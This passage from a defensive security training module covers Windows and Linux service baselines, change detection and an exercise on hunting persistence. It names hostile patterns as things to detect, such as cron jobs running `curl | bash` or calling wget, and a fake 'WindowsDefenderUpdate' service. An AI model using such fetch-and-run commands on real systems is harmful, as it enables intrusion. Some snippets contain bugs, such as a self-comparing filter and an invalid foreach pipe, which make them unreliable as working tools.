- Run Autoruns monthly on all endpoints and compare output to a baseline
- Enable registry auditing on persistence keys (see Windows Hardening guide)

---

## 6. Baseline Comparison Methodology

### 🟢 Beginner Explanation

A **baseline** is a documented snapshot of a system's known-good state — the services that are supposed to be running, the tasks that are supposed to be scheduled, the ports that are supposed to be listening. By comparing the current state against the baseline, defenders can quickly identify what has changed — which is often exactly what the attacker modified.

This is the foundation of **change detection**: if you don't know what normal looks like, you cannot identify abnormal.

### 🔬 Technical Deep Dive

#### Creating a Windows Service Baseline

```powershell
# Create a comprehensive service baseline
function Export-ServiceBaseline {
    param([string]$OutputPath = ".\baseline_services_$(Get-Date -Format 'yyyyMMdd_HHmm').csv")

    $baseline = Get-WmiObject Win32_Service | Select-Object `
        Name,
        DisplayName,
        Description,
        StartMode,
        State,
        @{N='PathName'; E={$_.PathName}},
        StartName,
        @{N='SHA256'; E={
            $path = ($_.PathName -split '\s+[-/]')[0].Trim('"').Trim()
            if ($path -and (Test-Path $path)) {
                (Get-FileHash -Path $path -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
            } else { 'PATH_NOT_FOUND' }
        }}

    $baseline | Export-Csv -Path $OutputPath -NoTypeInformation
    Write-Host "Baseline exported to: $OutputPath"
    Write-Host "Total services: $($baseline.Count)"
    return $baseline
}

$baseline = Export-ServiceBaseline
```

#### Comparing Current State Against Baseline

```powershell
function Compare-ServiceBaseline {
    param(
        [string]$BaselinePath,   # Path to the previously exported baseline CSV
        [string]$OutputPath = ".\service_diff_$(Get-Date -Format 'yyyyMMdd_HHmm').txt"
    )

    $baseline = Import-Csv -Path $BaselinePath
    $current  = Get-WmiObject Win32_Service | Select-Object Name, DisplayName,
        StartMode, State,
        @{N='PathName'; E={$_.PathName}},
        StartName

    $baselineNames = $baseline | Select-Object -ExpandProperty Name
    $currentNames  = $current  | Select-Object -ExpandProperty Name

    $output = @()

    # New services (present now, not in baseline)
    $newServices = $currentNames | Where-Object {$_ -notin $baselineNames}
    if ($newServices) {
        $output += "`n⚠ NEW SERVICES (not in baseline):"
        $newServices | ForEach-Object {
            $svc = $current | Where-Object {$_.Name -eq $_}
            $output += "  + $($svc.Name) | $($svc.DisplayName) | Path: $($svc.PathName)"
        }
    }

    # Removed services (in baseline but not present now)
    $removedServices = $baselineNames | Where-Object {$_ -notin $currentNames}
    if ($removedServices) {
        $output += "`n⚠ REMOVED SERVICES (in baseline but not found now):"
        $removedServices | ForEach-Object {
            $output += "  - $_"
        }
    }

    # Changed services (present in both, but attributes differ)
    $changedServices = $currentNames | Where-Object {$_ -in $baselineNames} | ForEach-Object {
        $name = $_
        $base = $baseline | Where-Object {$_.Name -eq $name}
        $curr = $current  | Where-Object {$_.Name -eq $name}

        $changes = @()
        if ($base.StartMode -ne $curr.StartMode) { $changes += "StartMode: $($base.StartMode) → $($curr.StartMode)" }
        if ($base.State     -ne $curr.State    ) { $changes += "State: $($base.State) → $($curr.State)" }
        if ($base.PathName  -ne $curr.PathName ) { $changes += "PathName: $($base.PathName) → $($curr.PathName)" }
        if ($base.StartName -ne $curr.StartName) { $changes += "StartName: $($base.StartName) → $($curr.StartName)" }

        if ($changes) {
            [PSCustomObject]@{ Name = $name; Changes = $changes -join ' | ' }
        }
    }

    if ($changedServices) {
        $output += "`n⚠ CHANGED SERVICES (attributes differ from baseline):"
        $changedServices | ForEach-Object {
            $output += "  ~ $($_.Name): $($_.Changes)"
        }
    }

    if ($output.Count -eq 0) {
        $output += "`n✓ No differences found — current state matches baseline"
    }

    $output | Out-File -FilePath $OutputPath
    $output | Write-Host
}

# Usage:
# Compare-ServiceBaseline -BaselinePath ".\baseline_services_20240101_0900.csv"
```

#### Creating a Linux Service Baseline

```bash
# Create a service baseline on Linux
create_linux_baseline() {
    local output_file="baseline_services_$(date +%Y%m%d_%H%M).txt"

    echo "=== Linux Service Baseline ===" > "$output_file"
    echo "Generated: $(date)" >> "$output_file"
    echo "Hostname: $(hostname)" >> "$output_file"
    echo "" >> "$output_file"

    echo "--- Enabled systemd services ---" >> "$output_file"
    systemctl list-unit-files --type=service --state=enabled --no-legend |
        awk '{print $1}' | sort >> "$output_file"

    echo "" >> "$output_file"
    echo "--- Running processes ---" >> "$output_file"
    ps aux --no-headers | awk '{print $1, $11}' | sort >> "$output_file"

    echo "" >> "$output_file"
    echo "--- Listening ports ---" >> "$output_file"
    ss -tlnup --no-header | sort >> "$output_file"

    echo "" >> "$output_file"
    echo "--- Cron jobs (all users) ---" >> "$output_file"
    for user in $(cut -d: -f1 /etc/passwd); do
        cron=$(crontab -l -u "$user" 2>/dev/null)
        if [ -n "$cron" ]; then
            echo "[$user]: $cron" >> "$output_file"
        fi
    done

    echo "" >> "$output_file"
    echo "--- Cron directories ---" >> "$output_file"
    ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null >> "$output_file"

    echo "Baseline saved to: $output_file"
}

create_linux_baseline
```

```bash
# Compare current state against baseline
diff_against_baseline() {
    local baseline_file="$1"

    echo "=== Current state snapshot ==="
    local current_file="current_$(date +%Y%m%d_%H%M).txt"

    systemctl list-unit-files --type=service --state=enabled --no-legend |
        awk '{print $1}' | sort > "$current_file"

    echo "--- Enabled service differences ---"
    diff "$baseline_file" "$current_file"

    echo ""
    echo "--- New listening ports ---"
    # This compares current listening ports to baseline
    diff <(grep "Listening" "$baseline_file" 2>/dev/null || ss -tlnup --no-header | sort) \
         <(ss -tlnup --no-header | sort)
}
```

#### Automated Integrity Monitoring

For production environments, use dedicated File Integrity Monitoring (FIM) tools:

```bash
# AIDE (Advanced Intrusion Detection Environment) — Linux
sudo apt-get install aide -y

# Initialise the AIDE database (run after a known-clean baseline)
# ⚠️ Lab Environment Only — run after hardening is complete
sudo aide --init
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Run a check against the baseline
sudo aide --check

# Update the database after approved changes
sudo aide --update

# Configure AIDE to monitor critical paths (/etc/aide/aide.conf)
# /etc p+i+u+g+sha256
# /usr/bin p+i+u+g+sha256
# /etc/systemd p+i+u+g+sha256
```

#### Windows File Integrity Monitoring

```powershell
# Use Sysmon Events 11 (FileCreate) and 2 (FileCreateTimeChanged) for file monitoring
# Or use a dedicated FIM solution

# Quick hash-based integrity check of critical Windows paths
$criticalPaths = @(
    'C:\Windows\System32\drivers\',
    'C:\Windows\System32\',
    'C:\Windows\SysWOW64\'
)

foreach ($path in $criticalPaths) {
    Get-ChildItem -Path $path -File -Filter "*.sys" |
        ForEach-Object {
            [PSCustomObject]@{
                File   = $_.FullName
                SHA256 = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
                Modified = $_.LastWriteTime
            }
        }
} | Export-Csv "driver_hashes_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation
```

### 🌍 Real-World Relevance

NIST SP 800-128 (Guide for Security-Focused Configuration Management of Information Systems) and PCI DSS Requirement 11.5 both mandate baseline establishment and change detection as core security controls. Organisations that had established baselines and automated comparison (including major financial institutions) detected the 2020 SolarWinds supply chain compromise much faster than those without, because the malicious service and its network activity deviated from their documented baselines.

### 🛡️ Defensive Measures

- Take baselines immediately after hardening, before production deployment
- Run automated comparison weekly; alert on any deviation
- Treat all deviations as security incidents until proven otherwise
- Use versioned baselines (store in version control) so you can trace when changes occurred
- Combine service baseline comparison with Sysmon and auditd for defence in depth

---

## 7. Module Practice Challenge

> **Scenario:** You are a junior SOC analyst. Your team has received an alert that a Windows workstation and a Linux server are behaving unusually — high CPU, unexpected outbound network connections. Your job is to audit both systems for malicious services, scheduled tasks, and persistence mechanisms.

### 🏁 Challenge Tasks

**Tier 1 — Foundation**

1. **Windows:** Run `Get-WmiObject Win32_Service | Select-Object Name, PathName, State, StartName` and identify any service with a binary path outside `C:\Windows\` or `C:\Program Files\`. Document your findings.

2. **Windows:** Query Event ID 7045 for the last 30 days. List all newly installed services. Are any unexpected?

3. **Linux:** Run `systemctl list-unit-files --state=enabled` and document all enabled services. Cross-reference with `sudo ss -tlnup` — are any services listening on unexpected ports?

4. **Linux:** Check all cron locations:
   ```bash
   sudo crontab -l -u root
   sudo ls -la /etc/cron.d/ /var/spool/cron/crontabs/
   ```
   Identify any entries running commands from `/tmp`, `/dev/shm`, or via `curl | bash`.

5. **Windows:** Enumerate all registry autorun locations from Section 5. Record every value you find. Research any unfamiliar entries.

**Tier 2 — Intermediate**

6. **Windows:** Run Autoruns (or `autorunsc.exe -a * -u`) and examine unsigned entries. What is the first step you would take to investigate an unsigned entry?

7. **Windows:** List all scheduled tasks outside `\Microsoft\` with actions pointing to `%APPDATA%` or `%TEMP%`. Are any found? What Event IDs would you check to see when they were created?

8. **Linux:** Write a one-liner that shows all cron jobs for all users that contain the word `curl` or `wget`:
   ```bash
   # Hint: combine 'for user in $(cut -d: -f1 /etc/passwd)' with 'crontab -l -u'
   ```

9. **Both platforms:** Take a service baseline now (export to CSV/text file). Then install a test service/cron job, take a new snapshot, and use the comparison script from Section 6 to detect it. Remove the test service when done.

10. **Windows:** Check `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` for Shell and Userinit values. Document their current values. What would a modified Shell value look like, and why is it dangerous?

**Tier 3 — Advanced**

11. Write a PowerShell function `Find-SuspiciousServices` that:
    - Checks all services for binaries outside `C:\Windows` and `C:\Program Files`
    - Checks all services for unsigned binaries
    - Checks for service names matching known malicious patterns (e.g., impersonating svchost)
    - Outputs a formatted report with a risk score (Low/Medium/High) for each finding

12. Write a Bash script `audit_persistence.sh` that:
    - Lists all enabled systemd services with their ExecStart paths
    - Lists all cron jobs for all users
    - Checks for processes running from `/tmp`, `/dev/shm`
    - Outputs a formatted report with timestamps

13. **Threat Hunting Scenario:** You find the following entry during a Windows service audit:
    ```
    Name: WindowsDefenderUpdate
    PathName: "C:\Users\Public\wdu.exe" -service
    StartName: LocalSystem
    State: Running
    ```
    Document your complete investigation steps: what additional data would you collect, what Event IDs would you query, and what would your recommended remediation be?

14. Research and document 5 additional Windows registry persistence locations not covered in Section 5 (hint: look at the MITRE ATT&CK T1547 technique page). For each, provide the registry path, a description of how attackers use it, and a PowerShell query to audit it.

### ✅ Success Criteria

- You can enumerate all running services and their binary paths on both Windows and Linux
- You can identify at least 3 indicators that suggest a service may be malicious
- You can query all cron job locations on Linux for all users
- You have successfully created a baseline and detected a change using comparison scripts
- You can explain what Event IDs to alert on for service and scheduled task persistence on Windows
- You have a documented understanding of at least 10 Windows registry persistence locations

---

← [Back to System Security Overview](./README.md) | [Previous: Linux Hardening ←](./Linux_Hardening.md)
